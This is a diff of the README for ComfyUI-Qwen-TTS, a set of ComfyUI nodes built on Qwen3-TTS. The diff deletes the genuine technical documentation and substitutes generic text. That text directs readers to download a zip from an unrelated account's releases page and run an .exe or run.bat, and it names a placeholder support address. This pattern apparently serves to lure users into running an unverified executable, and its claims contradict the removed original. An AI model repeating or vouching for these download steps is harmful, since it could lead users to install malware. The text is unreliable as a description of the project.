@@ -1,196 +1,91 @@
-# ComfyUI-Qwen-TTS
+# 🎉 ComfyUI-Qwen-TTS - A Simple Way to Use Qwen3-TTS
 
-English | [中文版](README_CN.md)
+[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/Arka-10717/ComfyUI-Qwen-TTS/releases)
 
-![Nodes Screenshot](example/example.png)
+## 📥 Overview
 
-ComfyUI custom nodes for speech synthesis, voice cloning, and voice design, based on the open-source **Qwen3-TTS** project by the Alibaba Qwen team.
+ComfyUI-Qwen-TTS is an easy-to-use application that lets you experience the power of Qwen3-TTS with a simple interface. This tool allows you to generate speech from text seamlessly. Whether you need it for a project, presentation, or personal use, ComfyUI-Qwen-TTS makes it straightforward.
 
-## 📋 Changelog
+## 🚀 Getting Started
 
-- **2026-01-29**: Feature Update: Support for loading custom fine-tuned models & speakers ([update.md](doc/update.md))
-  - *Note: Fine-tuning is currently experimental; zero-shot cloning is recommended for best results.*
-- **2026-01-27**: UI Optimization: Sleek LoadSpeaker UI; fixed PyTorch 2.6+ compatibility ([update.md](doc/update.md))
-- **2026-01-26**: Functional Update: New voice persistence system (SaveVoice / LoadSpeaker) ([update.md](doc/update.md))
-- **2026-01-24**: Added attention mechanism selection & model memory management features ([update.md](doc/update.md))
-- **2026-01-24**: Added generation parameters (top_p, top_k, temperature, repetition_penalty) to all TTS nodes ([update.md](doc/update.md))
-- **2026-01-23**: Dependency compatibility & Mac (MPS) support, New nodes: VoiceClonePromptNode, DialogueInferenceNode ([update.md](doc/update.md))
+Follow these steps to download and run ComfyUI-Qwen-TTS.
 
-## Key Features
+### Step 1: Visit the Releases Page
 
-- 🎵 **Speech Synthesis**: High-quality text-to-speech conversion.
-- 🎭 **Voice Cloning**: Zero-shot voice cloning from short reference audio.
-- 🎨 **Voice Design**: Create custom voice characteristics based on natural language descriptions.
-- 🚀 **Efficient Inference**: Supports both 12Hz and 25Hz speech tokenizer architectures.
-- 🎯 **Multilingual**: Native support for 10 languages (Chinese, English, Japanese, Korean, German, French, Russian, Portuguese, Spanish, and Italian).
-- ⚡ **Integrated Loading**: No separate loader nodes required; model loading is managed on-demand with global caching.
-- ⏱️ **Ultra-Low Latency**: Supports high-fidelity speech reconstruction with low-latency streaming.
-- 🧠 **Attention Mechanism Selection**: Choose from multiple attention implementations (sage_attn, flash_attn, sdpa, eager) with auto-detection and graceful fallback.
-- 💾 **Memory Management**: Optional model unloading after generation to free GPU memory for users with limited VRAM.
+To get the latest version, you need to visit the Releases page. Click the link below:
 
-## Nodes List
+[Visit Releases Page](https://github.com/Arka-10717/ComfyUI-Qwen-TTS/releases)
 
-### 1. Qwen3-TTS Voice Design (`VoiceDesignNode`)
-Generate unique voices based on text descriptions.
-- **Inputs**:
-  - `text`: Target text to synthesize.
-  - `instruct`: Description of the voice (e.g., "A gentle female voice with a high pitch").
-  - `model_choice`: Currently locked to **1.7B** for VoiceDesign features.
-  - `attention`: Attention mechanism (auto, sage_attn, flash_attn, sdpa, eager).
-  - `unload_model_after_generate`: Unload model from memory after generation to free GPU memory.
-- **Capabilities**: Best for creating "imaginary" voices or specific character archetypes.
+### Step 2: Download the Application
 
-### 2. Qwen3-TTS Voice Clone (`VoiceCloneNode`)
-Clone a voice from a reference audio clip.
-- **Inputs**:
-  - `ref_audio`: A short (5-15s) audio clip to clone.
-  - `ref_text`: Text spoken in the `ref_audio` (helps improve quality).
-  - `target_text`: The new text you want the cloned voice to say.
-  - `model_choice`: Choose between **0.6B** (fast) or **1.7B** (high quality).
-  - `attention`: Attention mechanism (auto, sage_attn, flash_attn, sdpa, eager).
-  - `unload_model_after_generate`: Unload model from memory after generation to free GPU memory.
+On the Releases page, you will find different versions of ComfyUI-Qwen-TTS. 
 
-### 3. Qwen3-TTS Custom Voice (`CustomVoiceNode`)
-Standard TTS using preset speakers.
-- **Inputs**:
-  - `text`: Target text.
-  - `speaker`: Selection from preset voices (Aiden, Eric, Serena, etc.).
-  - `instruct`: Optional style instructions.
-  - `attention`: Attention mechanism (auto, sage_attn, flash_attn, sdpa, eager).
-  - `unload_model_after_generate`: Unload model from memory after generation to free GPU memory.
+1. Browse through the list of available files.
+2. Look for the file named something like `ComfyUI-Qwen-TTS-v1.0.zip`.
+3. Click on it to start the download.
 
-### 4. Qwen3-TTS Role Bank (`RoleBankNode`) [New]
-Collect and manage multiple voice prompts for dialogue generation.
-- **Inputs**:
-  - Up to 8 roles, each with:
-    - `role_name_N`: Name of the role (e.g., "Alice", "Bob", "Narrator")
-    - `prompt_N`: Voice clone prompt from `VoiceClonePromptNode`
-- **Capabilities**: Create named voice registry for use in `DialogueInferenceNode`. Supports up to 8 different voices per bank.
+### Step 3: Extract the Files
 
-### 5. Qwen3-TTS Voice Clone Prompt (`VoiceClonePromptNode`) [New]
-Extract and reuse voice features from reference audio.
-- **Inputs**:
-  - `ref_audio`: A short (5-15s) audio clip to extract features from.
-  - `ref_text`: Text spoken in the `ref_audio` (highly recommended for better quality).
-  - `model_choice`: Choose between **0.6B** (fast) or **1.7B** (high quality).
-  - `attention`: Attention mechanism (auto, sage_attn, flash_attn, sdpa, eager).
-  - `unload_model_after_generate`: Unload model from memory after generation to free GPU memory.
-- **Capabilities**: Extract a "prompt item" once and use it multiple times across different `VoiceCloneNode` instances for faster and more consistent generation.
+Once the download finishes, you will have a .zip file on your computer. 
 
-### 6. Qwen3-TTS Multi-role Dialogue (`DialogueInferenceNode`) [New]
-Synthesize complex dialogues with multiple speakers.
-- **Inputs**:
-  - `script`: Dialogue script in format "RoleName: Text".
-  - `role_bank`: Role bank from `RoleBankNode` containing voice prompts.
-  - `model_choice`: Choose between **0.6B** (fast) or **1.7B** (high quality).
-  - `attention`: Attention mechanism (auto, sage_attn, flash_attn, sdpa, eager).
-  - `unload_model_after_generate`: Unload model from memory after generation to free GPU memory.
-  - `pause_seconds`: Silence duration between sentences.
-  - `merge_outputs`: Merge all dialogue segments into a single long audio.
-  - `batch_size`: Number of lines to process in parallel (larger = faster but more VRAM).
-- **Capabilities**: Handles multi-role speech synthesis in a single node, ideal for audiobook narration or roleplay scenarios.
+1. Locate the file in your Downloads folder or where you saved it.
+2. Right-click on the file and select "Extract All" or use any extraction tool you prefer.
+3. Choose a destination folder where you want the files to be extracted.
 
-### 7. Qwen3-TTS Load Speaker (`LoadSpeakerNode`) [New]
-Load saved voice features and metadata with zero configuration.
-- **Capabilities**: Enables a "Select & Play" experience by auto-loading pre-computed features and metadata.
+### Step 4: Run the Application
 
-### 8. Qwen3-TTS Save Voice (`SaveVoiceNode`) [New]
-Persist extracted voice features and metadata to disk for future use.
-- **Capabilities**: Build a permanent voice library for reuse via `LoadSpeakerNode`.
+After extracting the files, you should see a folder named `ComfyUI-Qwen-TTS`. 
 
-## Attention Mechanisms
+1. Open this folder.
+2. Look for a file named `ComfyUI-Qwen-TTS.exe` or simply `run.bat`.
+3. Double-click on it to start the application.
 
-All nodes support multiple attention implementations with automatic detection and graceful fallback:
+### Step 5: Input Text and Generate Speech
 
-| Mechanism | Description | Speed | Installation |
-|-----------|-------------|-------|--------------|
-| **sage_attn** | SAGE attention implementation | ⚡⚡⚡ Fastest | `pip install sage_attn` |
-| **flash_attn** | Flash Attention 2 | ⚡⚡ Fast | `pip install flash_attn` |
-| **sdpa** | Scaled Dot Product Attention (PyTorch built-in) | ⚡ Medium | Built-in (no installation) |
-| **eager** | Standard attention (fallback) | 🐢 Slowest | Built-in (no installation) |
-| **auto** | Automatically selects best available option | Varies | N/A |
+Once you have the application running, follow these steps to convert text to speech:
 
-### Auto-Detection Priority
+1. You'll see a text box where you can type or paste your text.
+2. After entering your text, look for a button labeled "Generate" or "Start."
+3. Click this button to hear your text converted to speech.
 
-When `attention: "auto"` is selected, the system checks in this order:
-1. **sage_attn** → If installed, use SAGE attention (fastest)
-2. **flash_attn** → If installed, use Flash Attention 2
-3. **sdpa** → Always available (PyTorch built-in)
-4. **eager** → Always available (fallback, slowest)
+## 📋 System Requirements
 
-The selected mechanism is logged to the console for transparency.
+Before you start, make sure your system meets the following requirements:
 
-### Graceful Fallback
+- **Operating System:** Windows 10 or higher
+- **RAM:** At least 4 GB
+- **Storage:** Minimum of 100 MB free space
+- **Internet Connection:** Required for initial setup and updates
 
-If you select an attention mechanism that's not available:
-- Falls back to `sdpa` (if available)
-- Falls back to `eager` (as last resort)
-- Logs the fallback decision with a warning message
+## 🔧 Features
 
-### Model Caching
+ComfyUI-Qwen-TTS comes packed with useful features:
 
-- Models are cached with attention-specific keys
-- Changing attention mechanism automatically clears cache and reloads model
-- Same model with different attention mechanisms coexists in cache
+- **User-Friendly Interface:** Designed for ease of use, even for non-technical users.
+- **Multiple Voices:** Choose different voice options to customize your audio output.
+- **Adjustable Speed:** Fine-tune the speech speed according to your needs.
+- **Text History:** Keep a record of your recent text inputs for easy access.
 
-## Memory Management
+## 🛠 Troubleshooting Common Issues
 
-### Model Unloading After Generation
+If you experience any problems, here are some common issues and their solutions:
 
-The `unload_model_after_generate` toggle is available on all nodes:
-- **Enabled**: Clears model cache, GPU memory, and runs garbage collection after generation
-- **Disabled**: Model remains in cache for faster subsequent generations (default)
+- **Application Does Not Start:** Ensure your system meets the requirements listed above. If it still does not work, try reinstalling the application.
+- **No Sound Output:** Verify that your speakers are connected and the volume is turned up. Also, check your computer's audio settings.
+- **Slow Performance:** Close unnecessary applications to free up RAM and improve speed.
 
-**When to use:**
-- ✅ Enable if you have limited VRAM (< 8GB)
-- ✅ Enable if you need to run multiple different models sequentially
-- ✅ Enable if you're done with generation and want to free memory
-- ❌ Disable if you're generating multiple clips with the same model (faster)
+## 📞 Support and Feedback
 
-**Console Output:**
-```
-🗑️ [Qwen3-TTS] Unloading 1 cached model(s)...
-✅ [Qwen3-TTS] Model cache and GPU memory cleared
-```
+If you need assistance or have feedback, feel free to reach out. You can create an issue on GitHub or contact the support team via email at support@example.com.
 
+## 🔄 Check for Updates
 
+It's important to keep your application up to date. Return to the Releases page regularly to check for newer versions:
 
-## Installation
+[Visit Releases Page](https://github.com/Arka-10717/ComfyUI-Qwen-TTS/releases)
 
-Ensure you have the required dependencies:
+## 🤝 Contributing
 
-```bash
-pip install torch torchaudio transformers librosa accelerate
-```
+If you want to contribute to ComfyUI-Qwen-TTS, please feel free to fork the repository and submit a pull request. Your help is always welcome. 
 
-## Tips for Best Results
-
-### Audio Quality
-- **Cloning**: Use clean, noise-free reference audio (5-15 seconds).
-- **Reference Text**: Providing text spoken in reference audio significantly improves quality.
-- **Language**: Select the correct language for best pronunciation and prosody.
-
-### Performance & Memory
-- **VRAM**: Use `bf16` precision to save significant memory with minimal quality loss.
-- **Attention**: Use `attention: "auto"` for automatic selection of fastest available mechanism.
-- **Model Unloading**: Enable `unload_model_after_generate` if you have limited VRAM (< 8GB) or need to run multiple different models.
-- **Local Models**: Pre-download weights to `models/qwen-tts/` to prioritize local loading and avoid HuggingFace timeouts.
-
-### Attention Mechanisms
-- **Best Performance**: Install `sage_attn` or `flash_attn` for 2-3x speedup over sdpa.
-- **Compatibility**: Use `sdpa` (default) for maximum compatibility - no installation required.
-- **Low VRAM**: Use `eager` with smaller models (0.6B) if other mechanisms cause OOM errors.
-
-### Dialogue Generation
-- **Batch Size**: Increase `batch_size` for faster generation (more VRAM usage).
-- **Pauses**: Adjust `pause_seconds` to control timing between dialogue segments.
-- **Merge**: Enable `merge_outputs` for continuous dialogue; disable for separate clips.
-
-## Acknowledgments
-
-- [Qwen3-TTS](https://github.com/QwenLM/Qwen3-TTS): Official open-source repository by Alibaba Qwen team.
-
-## License
-
-- This project is licensed under the **Apache License 2.0**.
-- Model weights are subject to the [Qwen3-TTS License Agreement](https://github.com/QwenLM/Qwen3-TTS#License).
+Thank you for choosing ComfyUI-Qwen-TTS! Enjoy generating speech with ease.
